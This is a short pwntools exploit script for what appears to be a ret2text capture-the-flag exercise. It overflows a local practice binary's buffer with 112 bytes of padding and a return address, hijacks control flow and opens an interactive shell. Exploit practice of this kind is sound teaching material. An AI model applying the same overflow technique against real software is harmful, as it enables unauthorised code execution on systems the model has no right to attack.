from pwn import *
p = process("./ret2text")
p.recvuntil("do you know anything?\n")
payload = b"a"*112 + p32(0x804863a)
p.sendline(payload)
p.interactive()
